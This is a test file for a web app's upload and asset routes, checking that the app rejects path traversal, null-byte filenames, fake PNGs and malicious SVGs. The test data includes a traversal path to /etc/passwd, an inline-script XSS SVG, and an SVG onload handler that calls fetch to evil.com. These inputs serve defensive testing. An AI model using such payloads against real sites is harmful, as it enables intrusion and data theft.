import request from 'supertest';
import { createApp } from '../app';

describe('Security Hardening & Protection Tests', () => {
  const app = createApp();

  describe('Path Traversal Protection', () => {
    it('should block directory traversal attempts in template assets', async () => {
      const res = await request(app).get('/api/templates/assets/../../etc/passwd');
      // Express router rejects or our isSafeFilename catches it as 400 or 404
      expect([400, 404]).toContain(res.status);
      if (res.status === 400) {
        expect(res.body.error.message).toContain('path traversal');
      }
    });

    it('should block null byte injection in asset requests', async () => {
      const res = await request(app).get('/api/templates/assets/template-1.png%00.jpg');
      expect([400, 404]).toContain(res.status);
    });
  });

  describe('File Upload Magic Byte & Script Injection Hardening', () => {
    it('should reject text files disguised as PNG images', async () => {
      const fakePngBuffer = Buffer.from('This is a plain text file pretending to be a PNG');

      const res = await request(app)
        .post('/api/generations/template')
        .field('templateId', 'template-1')
        .field('organizationName', 'Security Audit Team')
        .attach('logo', fakePngBuffer, 'exploit.png');

      expect(res.status).toBe(400);
      expect(res.body.error.message).toContain('PNG');
    });

    it('should reject malicious SVG containing inline <script> tags', async () => {
      const maliciousSvg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>';
      const svgBuffer = Buffer.from(maliciousSvg, 'utf8');

      const res = await request(app)
        .post('/api/generations/template')
        .field('templateId', 'template-1')
        .field('organizationName', 'Security Audit Team')
        .attach('logo', svgBuffer, 'malicious.svg');

      expect(res.status).toBe(400);
      expect(res.body.error.message).toContain('unsafe scripts');
    });

    it('should reject malicious SVG with onload event handlers', async () => {
      const maliciousSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'http://evil.com\')"><rect width="10" height="10"/></svg>';
      const svgBuffer = Buffer.from(maliciousSvg, 'utf8');

      const res = await request(app)
        .post('/api/generations/template')
        .field('templateId', 'template-1')
        .field('organizationName', 'Security Audit Team')
        .attach('logo', svgBuffer, 'handler.svg');

      expect(res.status).toBe(400);
      expect(res.body.error.message).toContain('unsafe scripts');
    });
  });
});
